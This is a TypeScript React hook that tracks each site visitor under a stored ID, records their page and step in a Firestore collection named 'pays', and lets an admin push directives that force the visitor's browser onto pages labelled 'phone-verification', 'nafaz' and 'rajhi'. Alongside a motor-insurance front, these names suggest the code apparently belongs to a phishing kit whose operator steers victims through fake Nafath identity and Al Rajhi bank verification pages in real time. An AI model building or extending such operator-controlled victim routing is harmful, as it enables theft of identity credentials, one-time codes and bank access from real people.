import { useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";

export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";

export interface AdminDirective {
  targetPage?: RoutablePage;
  targetStep?: number;
  issuedAt?: string;
  issuedBy?: string;
}

export interface VisitorData {
  adminDirective?: AdminDirective;
  currentPage?: string;
  currentStep?: number;
}

const PAGE_ROUTES: Record<RoutablePage, string> = {
  "motor": "/motor",
  "motor-insurance": "/motor",
  "phone-verification": "/phone",
  "nafaz": "/nafaz",
  "rajhi": "/rajhi",
  "done": "/motor",
};

// Store pending directive globally so it persists across page navigations
let pendingDirective: { directive: AdminDirective; key: string } | null = null;

interface UseVisitorRoutingOptions {
  currentPage: RoutablePage;
  currentStep?: number;
  onStepChange?: (step: number) => void;
}

export function useVisitorRouting({
  currentPage,
  currentStep,
  onStepChange,
}: UseVisitorRoutingOptions) {
  const [location, setLocation] = useLocation();
  const processedDirectivesRef = useRef<Set<string>>(new Set());

  const getVisitorId = useCallback((): string => {
    if (typeof localStorage === "undefined") return "";
    
    let visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      visitorId = generateVisitorId();
      localStorage.setItem("visitor", visitorId);
    }
    return visitorId;
  }, []);

  const visitorId = getVisitorId();

  const updateVisitorState = useCallback(async (page: RoutablePage, step?: number) => {
    if (!visitorId) return;
    
    await addData({
      id: visitorId,
      currentPage: page,
      currentStep: step,
    });
  }, [visitorId]);

  // Check for pending directive when page changes
  useEffect(() => {
    if (pendingDirective && pendingDirective.directive.targetPage === currentPage) {
      const { directive, key } = pendingDirective;
      
      // Apply the step if we're now on the correct page
      if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
        onStepChange(directive.targetStep);
      }
      
      // Mark as processed and clear pending
      processedDirectivesRef.current.add(key);
      pendingDirective = null;
    }
  }, [currentPage, currentStep, onStepChange]);

  useEffect(() => {
    if (!visitorId || !db || !isFirebaseConfigured) return;

    const docRef = doc(db, "pays", visitorId);
    
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (!docSnap.exists()) return;
      
      const data = docSnap.data() as VisitorData;
      const directive = data.adminDirective;
      
      if (!directive || !directive.targetPage) return;

      const directiveKey = `${directive.targetPage}-${directive.targetStep}-${directive.issuedAt}`;
      
      // Skip if already processed
      if (processedDirectivesRef.current.has(directiveKey)) return;

      if (directive.targetPage !== currentPage) {
        // Store directive for after navigation completes
        pendingDirective = { directive, key: directiveKey };
        
        const targetRoute = PAGE_ROUTES[directive.targetPage];
        if (targetRoute && location !== targetRoute) {
          setLocation(targetRoute);
        }
      } else {
        // Already on correct page, just apply step
        processedDirectivesRef.current.add(directiveKey);
        
        if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
          onStepChange(directive.targetStep);
        }
      }
    }, (error) => {
      console.error("Error listening to visitor routing:", error);
    });

    return () => unsubscribe();
  }, [visitorId, currentPage, currentStep, location, setLocation, onStepChange]);

  useEffect(() => {
    if (visitorId && currentPage) {
      updateVisitorState(currentPage, currentStep);
    }
  }, [visitorId, currentPage, currentStep, updateVisitorState]);

  return {
    visitorId,
    updateVisitorState,
  };
}
